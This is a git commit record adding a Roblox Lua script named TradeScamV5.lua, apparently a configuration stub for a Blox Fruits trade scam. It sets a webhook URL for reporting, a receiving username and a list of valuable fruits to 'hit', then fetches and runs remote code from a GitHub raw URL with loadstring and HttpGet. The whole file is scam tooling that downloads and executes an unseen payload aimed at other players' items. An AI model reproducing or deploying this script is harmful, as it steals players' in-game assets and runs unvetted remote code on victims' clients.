1e426ee4be96b72c4e214813fc890eda6e09157e
NaruTeam <naruteamservice@gmail.com>
2025-03-16 14:26:23 +0700

    Create TradeScamV5.lua

---
+++ TradeScamV5.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=UGpMcHFzR0N0OEtaX0JzdW02VVNtdzpKTG5FUUtvVXNoSHpQYXNNQU9RTDdILTk0a0ZSR0tZdHV1Z2ZsVVN4b0hwenpmTFY1UXVvLVdNcnZLMjNQdmhjdlNZX1d1S1BBYUFhUVhncDdFSmRaSmpXcnlBbi03cDBUMm9XanlrNXBGWXBOTS1SbG4ySzhiMWY5MTFlU0NzTVFIdjhUN1dGTEJYWWg5X3JwUlU1ZG1SeDlTU19CXy13STdVbHNxTnVGQkk"
+Usernames = {"HTNTPbloxfruit-mfzgnr-tarronfj"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Spirit-Spirit", "Gas-Gas", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "T-Rex-T-Rex", "Mammoth-Mammoth", "Portal-Portal", "Buddha-Buddha", "Rumble-Rumble"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
